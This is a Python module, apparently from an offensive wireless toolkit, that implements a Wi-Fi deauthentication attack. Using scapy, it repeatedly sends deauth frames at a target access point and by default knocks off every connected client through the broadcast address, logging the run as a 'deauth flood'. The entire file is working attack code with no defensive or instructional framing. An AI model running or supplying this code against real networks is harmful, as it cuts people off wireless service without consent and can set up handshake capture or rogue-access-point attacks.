"""
Deauthentication Attack Module
Fires deauth frames to disconnect clients from an AP.
"""
from scapy.all import sendp
from daemon.modules.utils.packet_crafter import PacketCrafter
from daemon.modules.utils.validators import valid_mac


class DeauthAttack:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        client = args.client or "ff:ff:ff:ff:ff:ff"
        count = args.count
        iface = self.config.mon_iface

        if not valid_mac(bssid):
            self.logger.error("Invalid target BSSID.")
            return False

        self.logger.attack_log(f"Deauth -> {bssid} | client={client} | count={count}")
        pkts = PacketCrafter.deauth(bssid, client)
        try:
            for i in range(count):
                sendp(pkts, iface=iface, verbose=0, count=1)
                if i % 32 == 0:
                    self.logger.info(f"Sent {i} deauth frames...")
            self.logger.success("Deauth flood complete.")
            return True
        except Exception as e:
            self.logger.error(f"Deauth failed: {e}")
            return False
